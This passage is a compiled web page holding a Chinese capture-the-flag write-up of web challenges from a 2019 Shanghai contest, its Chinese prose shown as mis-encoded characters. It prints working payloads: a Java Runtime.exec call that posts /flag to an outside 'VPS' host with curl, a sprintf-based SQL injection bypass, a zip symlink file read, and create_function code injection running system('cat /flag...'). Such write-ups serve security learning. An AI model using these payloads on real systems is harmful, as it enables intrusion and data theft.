punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/flag'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__getattribute__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'read'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("ä½†æ˜¯é¢˜ç›®æç¤ºæ²¡æœ‰ "),a("code",[t._v("__base__")]),t._v(" å±æ€§ï¼Œæ€€ç–‘è¯¥å±æ€§åº”è¯¥æ˜¯è¢«banäº†ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/13.png",alt:"13"}})]),t._v(" "),a("p",[t._v("åæ¥é˜Ÿå‹æµ‹å‡ºç›´æ¥ç”¨openæ–¹æ³•ï¼Œç”¨ç©ºæ ¼éš”å¼€æ–¹æ³•åå’Œæ‹¬å·å³å¯ç›´æ¥è¯»å–flagã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/14.png",alt:"14"}})]),t._v(" "),a("p",[t._v("ç„¶åçœ‹äº†ä¸€ä¸‹æºç ")]),t._v(" "),a("p",[t._v("/proc/self/cwd/calc.php")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'php://input'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("json_decode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[t._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$encode_data")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("base64_encode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'expr'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'python ./final.py '")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$encode_data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("p",[t._v("/proc/self/cwd/final.py")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/15.png",alt:"15"}})]),t._v(" "),a("h2",{attrs:{id:"fast-calc-1"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#fast-calc-1"}},[t._v("#")]),t._v(" fast_calc_1")]),t._v(" "),a("p",[t._v("åˆæ­¥åˆ¤æ–­ï¼Œåç«¯ä»£ç å¯èƒ½ç”¨çš„æ˜¯nodejsæˆ–è€…JavaScriptã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/16.png",alt:"16"}})]),t._v(" "),a("p",[t._v("å°è¯•ç”¨Object.getOwnPropertyNames(this).join(â€˜::::::â€™)è¯»å–ä¸€ä¸‹thiså¯¹è±¡å±æ€§ï¼Œå‘ç°æœ‰java")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/17.png",alt:"17"}})]),t._v(" "),a("p",[t._v("å†æ¬¡å°è¯•java.language.Stringï¼Œå¯ä»¥ç¡®è®¤åç«¯ç”¨çš„æ˜¯Javaäº†")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/18.png",alt:"18"}})]),t._v(" "),a("p",[t._v("Javaä¸­æœ‰ä¸€ä¸ªæ–°ç‰¹æ€§å¯ä»¥æŠŠJavaScriptè½¬æˆJavaä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æ‰§è¡ŒJavaScriptï¼Œå³Nashorn")]),t._v(" "),a("p",[t._v("æ¥ä¸‹æ¥å°è¯•ä½¿ç”¨javaä»£ç è¯»å–flag")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("POST")]),t._v(" /calc.php HTTP/1.1")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Host:")]),t._v(" xxx\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Content-Type:")]),t._v(' application/json\n{"target":"/","expr":"java.lang.Runtime.getRuntime().exec(\'curl VPS -d @/flag\')"}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/19.png",alt:"19"}})]),t._v(" "),a("h2",{attrs:{id:"easysqli"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easysqli"}},[t._v("#")]),t._v(" easysqli")]),t._v(" "),a("p",[t._v("ä¸¤ä¸ªç‚¹ï¼š")]),t._v(" "),a("ul",[a("li",[t._v("usernameå’Œpasswordç»è¿‡addslasheså‡½æ•°å¤„ç†ã€‚")]),t._v(" "),a("li",[t._v("å½“usernameä¸ºadminæ—¶ï¼Œä¼šæ˜¾ç¤ºåå°æ‰§è¡Œçš„sqlè¯­å¥ã€‚")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/20.png",alt:"20"}})]),t._v(" "),a("p",[t._v("åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œæ‰€ä»¥æ­£å¸¸çš„SQLæ³¨å…¥å§¿åŠ¿æ˜¯ç»•ä¸è¿‡çš„ï¼Œåªèƒ½æƒ³åˆ°é…åˆsprintfå­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“å‚è€ƒï¼š"),a("a",{attrs:{href:"https://paper.seebug.org/386/",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://paper.seebug.org/386/"),a("OutboundLink")],1),t._v(" ã€‚çŒœæµ‹åå°ä»£ç åº”è¯¥ç±»ä¼¼è¿™æ ·ï¼š")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$user")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("addslashes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'user'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("addslashes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'pass'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sql")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sprintf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v("\"select * from users where username='%s' and password='"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")])]),t._v("'\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$user")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("æœ€ç»ˆåˆ©ç”¨payloadï¼š "),a("code",[t._v("http://xxxx//result.php?user=admin&pass=%1$'=0#")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/21.png",alt:"21"}})]),t._v(" "),a("h2",{attrs:{id:"parser"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#parser"}},[t._v("#")]),t._v(" parser")]),t._v(" "),a("p",[t._v("é¢˜ç›®é™„ä»¶ï¼š")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA"),a("OutboundLink")],1),t._v(" å¯†ç ï¼š"),a("code",[t._v("qppg")])]),t._v(" "),a("p",[t._v("æˆ‘ä»¬éœ€è¦æŠŠè§£æåçš„ASTæ–‡ä»¶ç¿»è¯‘æˆPHPä»£ç ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/22.png",alt:"22"}})]),t._v(" "),a("p",[t._v("æ¯”å¦‚ä¸Šé¢è¿™æ®µä»£ç ï¼Œç¿»è¯‘æˆPHPä»£ç ç±»ä¼¼ï¼š")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'var_'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'num'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'cat /flag'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("catch")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Exception "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$e")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("å…·ä½“å‚è€ƒï¼š"),a("a",{attrs:{href:"https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("ä¸Šé¢çš„ä»£ç å‘Šè¯‰æˆ‘ä»¬ï¼Œè‚¯å®šæœ‰ä¸€ä¸ªå˜é‡var_xxxå…¶å€¼å¯ä»¥ä¸ºå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¾‹å¦‚ï¼šsystemå‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™äº›var_xxxå˜é‡çš„å‘½åè§„åˆ™ï¼š")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/23.png",alt:"23"}})]),t._v(" "),a("p",[t._v("å¯ä»¥çœ‹åˆ° "),a("code",[t._v("var_")]),t._v(" åé¢åŸºæœ¬ä¸Šè·Ÿçš„éƒ½æ˜¯æ•°å­—ï¼Œé‚£è¿™é¢˜å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ç”¨BurpSuiteçˆ†ç ´å°±è¡Œäº†ã€‚å¦‚æœè¿™é¢˜ "),a("code",[t._v("var_")]),t._v(" åé¢è·Ÿçš„æ˜¯ä¸è§„åˆ™çš„å­—ç¬¦ï¼Œé‚£å¯èƒ½å°±è¦å…¨éƒ¨è¿˜åŸä¸€ä¸‹PHPä»£ç äº†ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/24.png",alt:"24"}})]),t._v(" "),a("h2",{attrs:{id:"easymanager"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#easymanager"}},[t._v("#")]),t._v(" easymanager")]),t._v(" "),a("p",[t._v("é¢˜ç›®æç¤ºï¼šä¸€ä¸ªå†…éƒ¨ç«™ç‚¹ æ‰€ä»¥å¯èƒ½å­˜åœ¨å†…ç½‘ã€‚æ³¨å†Œç”¨æˆ·åç™»å½•ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç ä¼šå‘ç°ä¸€ä¸ªhint\nhint: function.php source code may help u å‘ç°å­˜åœ¨ "),a("code",[t._v("function.php~")]),t._v(" æ–‡ä»¶ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/25.png",alt:"25"}})]),t._v(" "),a("p",[t._v("è®¿é—® "),a("code",[t._v("http:///xxxxxx/index.php?page=host")]),t._v(" ï¼Œä¼šæç¤ºPermission Deny! æ ¹æ®ä¸Šé¢ä»£ç å¼€å¤´check_urlå‡½æ•°å¯çŸ¥ï¼Œç¨‹åºä½¿ç”¨parse_urlæ¥è§£æurlï¼Œè€Œparse_urlå‡½æ•°å­˜åœ¨bypassã€‚äºæ˜¯è®¿é—® "),a("code",[t._v("http:///xxxxxx///index.php?page=host")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/26.png",alt:"26"}})]),t._v(" "),a("p",[t._v("è™½ç„¶æ˜¯æ˜¾ç¤º404ï¼Œä½†æ˜¯è¿™ä¸ªé¡µé¢çš„æºç ä¸­åˆæœ‰æç¤ºï¼š")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!-- Under repair .. host page can be access temporarily via 70b185c80f225924f86d4a1dedddd120.php --\x3e")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("ç›´æ¥è®¿é—® "),a("code",[t._v("http://xxxx/70b185c80f225924f86d4a1dedddd120.php")]),t._v(" ä¼šæç¤ºyou can not visit it directlyã€‚æ‰€ä»¥æˆ‘ä»¬è¦ "),a("code",[t._v("http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120")]),t._v(" è¿™æ ·è®¿é—®ã€‚")]),t._v(" "),a("p",[t._v("å‘ç°å¯ä»¥ä¸Šä¼ zipæ ¼å¼æ–‡ä»¶ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘ä¸€ä¸‹zipåè®®ã€‚ä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©é©¬ï¼Œä¼šå‘ç°å…¶ä¼šè¯»å–zipæ–‡ä»¶çš„å†…å®¹ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/27.png",alt:"27"}})]),t._v(" "),a("p",[t._v("é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•åˆ›å»ºè½¯é“¾æ¥æ–‡ä»¶ï¼Œå°†å…¶æ‰“åŒ…æˆzipå¹¶ä¸Šä¼ ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å–ç½‘ç«™æºç äº†ã€‚ä¾‹å¦‚ä¸‹é¢è¯»å–index.phpæºç ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/28.png",alt:"28"}})]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/29.png",alt:"29"}})]),t._v(" "),a("p",[t._v("index.php")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/30.png",alt:"30"}})]),t._v(" "),a("p",[t._v("host.phpã€function.php")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/31.png",alt:"31"}})]),t._v(" "),a("p",[t._v("/etc/apache2/sites-available/000-default.conf")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/32.png",alt:"32"}})]),t._v(" "),a("p",[t._v("å°è¯•è¯»å– "),a("code",[t._v("/flag")]),t._v(" æ²¡è¯»åˆ°ã€‚å‘ç° "),a("code",[t._v("/etc/apache2/sites-available/000-default.conf")]),t._v(" ä¸­æœ‰ "),a("code",[t._v("/var/www/html/m4nag3r_u_dont_know")]),t._v(" ç›®å½•ï¼Œè®¿é—® "),a("code",[t._v("http://xxxx/m4nag3r_u_dont_know/index.php")]),t._v(" å‡ºé”™ï¼Œé‚£ä¹ˆå°è¯•è¯»å– "),a("code",[t._v("/var/www/html/m4nag3r_u_dont_know/index.php")]),t._v(" æºç ")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v("// /var/www/html/m4nag3r_u_dont_know/index.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("create_function")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'func'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'flag'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("p",[t._v("æœ€åå°±æ˜¯create_functionä»£ç æ³¨å…¥äº†")]),t._v(" "),a("p",[a("code",[t._v("http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/33.png",alt:"33"}})]),t._v(" "),a("p",[a("code",[t._v("http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/34.png",alt:"34"}})]),t._v(" "),a("h2",{attrs:{id:"cat-market"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cat-market"}},[t._v("#")]),t._v(" cat market")]),t._v(" "),a("p",[t._v("ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¯ä¹¦æœ‰é—®é¢˜ï¼Œè€Œä¸”æ— æ³•æ­£å¸¸è®¿é—®ç½‘ç«™ã€‚")]),t._v(" 